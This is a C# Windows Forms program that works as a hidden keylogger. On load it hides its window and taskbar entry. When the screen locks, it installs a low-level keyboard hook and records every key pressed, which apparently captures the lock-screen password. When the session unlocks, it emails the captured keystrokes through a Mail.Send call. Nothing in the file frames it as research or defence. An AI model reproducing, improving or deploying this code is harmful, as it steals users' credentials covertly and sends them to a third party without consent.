using System;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void SetWindowsHook()
        {
            if (m_HookHandle == 0)
            {
                Debug.WriteLine("setWindowsHook");
                using (Process curProcess = Process.GetCurrentProcess())

                using (ProcessModule curModule = curProcess.MainModule)

                {
                    m_KbdHookProc = new HookProc(Form1.KeyboardHookProc);

                    m_HookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, m_KbdHookProc,

                         GetModuleHandle(curModule.ModuleName), 0);
                }

                if (m_HookHandle == 0)
                    return;
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            this.ShowInTaskbar = false;

            Microsoft.Win32.SystemEvents.SessionSwitch += new Microsoft.Win32.SessionSwitchEventHandler(SystemEvents_SessionSwitch);
        }

        private void SystemEvents_SessionSwitch(object sender, Microsoft.Win32.SessionSwitchEventArgs e)
        {
            if (e.Reason == Microsoft.Win32.SessionSwitchReason.SessionLock)
            {
                Debug.WriteLine("locked");
                SetWindowsHook();

                // 屏幕锁定
            }
            else if (e.Reason == Microsoft.Win32.SessionSwitchReason.SessionUnlock)
            {
                Debug.WriteLine("UnLocked");
                Mail.Send(message);
                UnhookWindowsHookEx(m_HookHandle);
                m_HookHandle = 0;
            }
        }

        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static int m_HookHandle = 0;    // Hook handle

        private const int WH_KEYBOARD_LL = 13;

        private HookProc m_KbdHookProc;            // 鍵盤掛鉤函式指標

        private static string message = "";


        // 設置掛鉤.

        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn,
        IntPtr hInstance, int threadId);

        // 將之前設置的掛鉤移除。記得在應用程式結束前呼叫此函式.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(int idHook);

        // 呼叫下一個掛鉤處理常式（若不這麼做，會令其他掛鉤處理常式失效）.
        [DllImport("user32.dll", CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
        public static extern int CallNextHookEx(int idHook, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static int KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // 當按鍵按下及鬆開時都會觸發此函式，這裡只處理鍵盤按下的情形。
            //bool isPressed = (lParam.ToInt32() & 0x80000000) == 0;

            if (nCode < 0)
            {
                return CallNextHookEx(m_HookHandle, nCode, wParam, lParam);
            }

            Keys a = KeyboardInfo.GetKey();
            
            if (a != Keys.None && a != Keys.Return)
            {
                message += a.ToString();
                Debug.WriteLine(a);
            }

            return CallNextHookEx(m_HookHandle, nCode, wParam, lParam);
        }
    }

    public class KeyboardInfo
    {
        private KeyboardInfo()
        {
        }

        [DllImport("user32")]
        private static extern short GetKeyState(int vKey);

        public static Keys GetKey()
        {
            foreach (Keys key in (Keys[])Enum.GetValues(typeof(Keys)))
            {
                KeyStateInfo keyState = GetKeyState(key);

                if (keyState.IsPressed)
                    return keyState.Key;
            }

            return Keys.None;
        }

        public static KeyStateInfo GetKeyState(Keys key)
        {
            int vkey = (int)key;

            if (key == Keys.Alt)
            {
                vkey = 0x12;    // VK_ALT
            }

            short keyState = GetKeyState(vkey);
            int low = Low(keyState);
            int high = High(keyState);
            bool toggled = (low == 1);
            bool pressed = (high == 1);

            return new KeyStateInfo(key, pressed, toggled);
        }

        private static int High(int keyState)
        {
            if (keyState > 0)
            {
                return keyState >> 0x10;
            }
            else
            {
                return (keyState >> 0x10) & 0x1;
            }
        }

        private static int Low(int keyState)
        {
            return keyState & 0xffff;
        }
    }

    public struct KeyStateInfo
    {
        private Keys m_Key;
        private bool m_IsPressed;
        private bool m_IsToggled;

        public KeyStateInfo(Keys key, bool ispressed, bool istoggled)
        {
            m_Key = key;
            m_IsPressed = ispressed;
            m_IsToggled = istoggled;
        }

        public static KeyStateInfo Default
        {
            get
            {
                return new KeyStateInfo(Keys.None, false, false);
            }
        }

        public Keys Key
        {
            get { return m_Key; }
        }

        public bool IsPressed
        {
            get { return m_IsPressed; }
        }

        public bool IsToggled
        {
            get { return m_IsToggled; }
        }
    }
}